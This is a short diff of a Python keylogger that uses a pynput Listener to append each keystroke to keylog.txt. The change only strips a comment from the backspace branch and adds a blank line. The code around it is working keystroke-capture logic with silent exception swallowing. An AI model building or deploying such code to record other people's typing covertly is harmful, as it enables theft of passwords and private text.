@@ -12,9 +12,10 @@ def log_keystroke(key):
             with open("keylog.txt", "a") as file:
                 file.write("\n")
         elif key == Key.backspace:
-            pass  # Backspace handling is complex for direct file writing
+            pass 
     except Exception as e:
         pass
 
 with Listener(on_press=log_keystroke) as listener:
+
     listener.join()
